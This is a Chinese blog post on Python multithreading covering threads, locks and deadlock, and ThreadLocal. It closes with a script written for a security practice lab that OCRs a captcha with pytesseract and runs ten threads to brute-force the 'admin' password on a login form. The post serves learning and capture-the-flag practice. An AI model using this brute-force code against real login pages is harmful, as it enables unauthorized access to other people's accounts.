---
layout: post
title: 	Python多线程
category : python
tags : [python, threading, pytesseract]
stickie: true
---

0x01 创建多线程
---

通常有两种方式添加多线程，一种是`import thread`，另一种是`import threading`，我们主要使用后者，因为后者的功能更加全面。

```python
import threading
import time
 
def thread():
	...
t = threading.Thread(target=thread)
 
t.start()
t.join()
```

`start`是启动线程，`join`是阻塞当前线程，即使得在当前线程结束时，不会退出。

0x02 线程锁
---

首先我们要了解什么是死锁。假设有两个全局资源，a和b，有两个线程`thread1`，`thread2`。` thread1`占用a，想访问b，但此时`thread2`占用b，想访问a，两个线程都不释放此时拥有的资源，那么就会造成死锁。

为了解决这个问题，就要使用`Lock`。 当访问某个资源之前，用`Lock.acquire()`锁住资源,访问之后，用`Lock.release()`释放资源。

0x03 ThreadLocal
---

`threadlocal`是为了解决线程中全局变量的问题。通过在线程中定义：`local = threading.local()`，此时这个`loca`l就变成了一个全局变量，但这个全局变量只在该线程中为全局变量，对于其他线程来说是局部变量，别的线程不可更改。

我用多线程写了这样一个破解脚本解决了这个问题[逗比的手机验证码](http://lab1.xseclab.com/vcode5_mobi_5773f3def9f77f439e058894cefc42a8/)，用多线程的话破解速度非常的快基本上只用了几秒钟。另外这个脚本中添加了验证码识别，使用python做验证码识别真的非常简洁，但是识别率根据图像变化很大的，有的图很难识别出来。就目前来看是个非常鸡肋的功能。

```python
import requests
import re
import threading

import pytesseract
from PIL import Image

url = r"http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php"
login = r"http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php"
v4_session = requests.Session()
url_content = v4_session.get(url).content  
print url_content

#验证码识别
def vcode():
	pic_url = re.findall(re.compile(r'<img src="(.*?)">'), url_content)
	pic= requests.get(pic_url[0], timeout=10)  
	f = open('C:\Python27\code.jpg', 'wb')  
	f.write(pic.content)  
	f.close() 
	im = Image.open('C:\Python27\code.jpg')
	text = pytesseract.image_to_string(im)

	if len(text) == 4:
		return text
	else:
		return 0


flag = False
first = 1000
second = 10000
lock = threading.Lock()
code = vcode()
print code

#多线程破解
def thread():
	global flag
	global first
	global second

	while not flag:
		lock.acquire()
		first = first + 1
		lock.release()
		
		data = {'username':'admin', 'pwd':first, 'vcode':code,'submit':'submit'}
		header = {'Cookie': 'PHPSESSID=a07cfae155b086fc57776e9d1e78721f'}
		f = v4_session.post(login, data=data, headers = header)  
		if 'error' not in f.content:
			print first
			print f.content
			flag = True
			break
		else:
			print 'try: ',first

#创建线程
threadNum = 10 
threadlist = []  
for i in range(threadNum):  
    threadlist.append(threading.Thread(target = thread))  
  
for i in threadlist:  
    i.start()  
for i in threadlist:  
    i.join()
```